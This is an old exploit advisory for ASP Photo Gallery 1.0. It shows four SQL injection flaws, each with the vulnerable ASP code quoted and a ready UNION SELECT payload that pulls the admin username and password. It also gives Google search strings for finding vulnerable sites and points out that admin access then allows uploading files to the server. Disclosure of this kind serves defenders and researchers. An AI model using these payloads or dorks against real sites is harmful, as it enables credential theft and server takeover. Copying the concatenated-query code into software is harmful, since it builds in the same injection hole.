<html><head><title>ASP Photo Gallery 1.0 Multiple SQL Injection Vulnerabilities</title></head><pre>######################################################################
#
# ASP Photo Gallery 1.0 - Multiple SQL Injection Vulnerabilities
#
# Date			: 12-january-2008
# Risk			: Medium
# Vendor URL		: http://www.matteobinda.com/apg.php
# Google Dork		: &quot;download this free gallery at matteobinda.com&quot;
#			: allinurl: imgbig.asp?id=
#
# Found By		: Ruben Ventura Pi√±a (Trew)
# Contact Info		: http://trew.icenetx.net
#			  trew.revolution@gmail.com
#			  ICEnetX Team - http://icenetx.net
#
######################################################################
#
#  Greetings oh earthlings: 
#	Ayzax, BRIO, Gaper (All ICEnetX Team)
#	and to all people who likes H.I.M, lol.
#
#	&quot;Maybe you can't break the system, but you can always hack it.&quot;
#
######################################################################
#
## Vulnerability ##
#
# &quot;ASP Photo Gallery&quot; is a free tool to create web galleries. It was
# written in ASP and uses an Access Database to store data.
# Input is not propperly santised, therefore the application has
# multiple SQL injection vulnerabilities.
#
# ---
# First bug:
# The following code in the Imgbig.asp file is vulnerable:
#	&lt;% ...
#	nomefoto = request(&quot;Id&quot;)
#	...
#	sql = &quot;SELECT * FROM fotoinfo WHERE name='&quot; &amp; nomefoto &amp; &quot;'&quot;
#	objrs.Open sql, objConn ,3,3
#	... %&gt;
#
# Input passed to the &quot;Id&quot; parameter is not santised. This can be
# exploited in the following manner to obtain the admin's password:
#
# http://[site]/Imgbig.asp?Id='union select user as name,1,pass as descrizione from stuff where '1'='1
#
# ---
# Second bug:
# The following code in the thumbricerca.asp file is vulnerable:
#	&lt;% ...
#	ricerca = Request.QueryString(&quot;id&quot;)
#	...
#	sql = &quot;SELECT * from fotoinfo where descrizione like '%&quot; &amp; ricerca &amp; &quot;%'  order by name desc&quot;
#	objrs.Open sql, objConn ,3,3
#	... %&gt;
#
# Input passed to the &quot;id&quot; parameter is not santised. This can be
# exploited in the following manner to obtain the admin's password:
#
# /thumbricerca.asp?id=-1'union select user as name,1,pass as descrizione from stuff where 1 like '%
#
# ---
# Third bug:
# The following code in the thumbricerca.asp file is vulnerable:
#	&lt;% ...
#	ricerca = request.form(&quot;ricerca&quot;)
#	...
#	sql = &quot;SELECT * from fotoinfo where descrizione like '%&quot; &amp; ricerca &amp; &quot;%'  order by name desc&quot;
#	objrs.Open sql, objConn ,3,3
#	... %&gt;
#
# Input passed to the &quot;ricerca&quot; parameter is not santised. This can be
# exploited by inserting the following code into the search textfield
# located in the thumbricerca.asp file:
#	-1'union select user as name,1,pass as descrizione from stuff where 1 like '%
# --
# Fourth bug:
# The following code in the thumb.asp file is vulnerable:
#	&lt;% ...
#	intCodice = request(&quot;id&quot;)
#	...
#	sql = &quot;SELECT * from fotoinfo where category ='&quot; &amp; intcodice &amp; &quot;' order by name desc&quot;
#	objrs.Open sql, objConn ,3,3
#	..%&gt;
#
# Input passed to the &quot;id&quot; parameter is not santised. This can be exploited
# in the following manner to obtain the admin's password:
#
#  /thumb.asp?id=' union select user as name,1,pass as descrizione from stuff where '1'='1
#
#
# After an attacker has logged in into the admin panel (/admin/admin.asp), he'll have the
# possibility to upload files to the server.
#
#
## How to fix ##
#
# Santise all input which is then used in SQL queries.
#

# milw0rm.com [2008-01-12]</pre></html>